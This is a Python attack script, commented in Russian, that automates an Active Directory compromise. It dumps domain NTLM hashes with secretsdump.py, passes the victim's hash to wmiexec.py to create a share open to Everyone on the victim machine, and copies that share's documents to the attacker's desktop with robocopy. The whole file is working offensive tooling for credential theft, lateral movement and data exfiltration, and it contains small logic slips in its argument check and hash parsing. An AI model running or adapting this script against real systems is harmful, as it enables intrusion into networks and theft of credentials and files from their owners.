# -*- coding: utf-8 -*- 
import subprocess 
import re 
import sys 
import os 
 
if len(sys.argv) < 6: 
    print("Использование: python script.py <domain> <attacker_name> <attacker_hash> <dc_ip> <victim_name> <victim_ip>") 
    sys.exit(1) 
 
domain = sys.argv[1] 
att_name = sys.argv[2] 
password = sys.argv[3] 
dc_ip = sys.argv[4] 
vic_name = sys.argv[5] 
vic_ip = sys.argv[6] 
 
# Проверяем, есть ли уже пользователь  в файле hashes.txt 
user_hash = None 
try: 
    with open("hashes.txt", "r") as file: 
        lines = file.readlines() 
 
    for line in lines: 
        if re.search(rf'^{vic_name}:', line): 
            user_hash = line.split(':')[2] + ':' + line.split(':')[3]  # Получение хэша пароля 
            break 
except FileNotFoundError: 
    pass  # Если файл hashes.txt еще не существует 
 
# Если пользователь ivanov не найден в файле, выполняем извлечение хэшей паролей 
if user_hash is None: 
    # Команда для запуска secretsdump.py 
    secretsdump_command = f"secretsdump.py -just-dc-ntlm -hashes {password} {domain}/{att_name}@{dc_ip}" 
 
    # Выполнение команды и сохранение вывода в файл 
    with open("hashes.txt", "w") as outfile: 
        subprocess.run(secretsdump_command, shell=True, check=True, stdout=outfile) 
 
    print("Хэши паролей сохранены в файл hashes.txt") 
 
    # Чтение файла и поиск пользователя 
    with open("hashes.txt", "r") as file: 
        lines = file.readlines() 
 
    for line in lines: 
        if re.search(rf'^{vic_name}:', line): 
            user_hash = line.split(':')[3] + ':' + line.split(':')[4] # Получение хэша пароля 
            break 
 
    if user_hash is None: 
        print("Пользователь не найден в полученных хэшах.") 
        exit(1) 
 
 
win_exec_smb = f'wmiexec.py -hashes {user_hash} {domain}/{vic_name}@{vic_ip} "powershell.exe New-SmbShare -Name "ShareBook" -Path "C:\\documents" -FullAccess "Everyone""' 
subprocess.run(win_exec_smb, shell=True) 
 
 
# Формируем команду PowerShell с использованием raw string literal 
powershell_command = f'robocopy \\\\{vic_ip}\\ShareBook\\ C:\\Users\\{att_name}\\Desktop\\' 
 
# Запуск команды через subprocess 
result = subprocess.run(["powershell.exe", "-Command", powershell_command], capture_output=True, text=True) 
print(result)
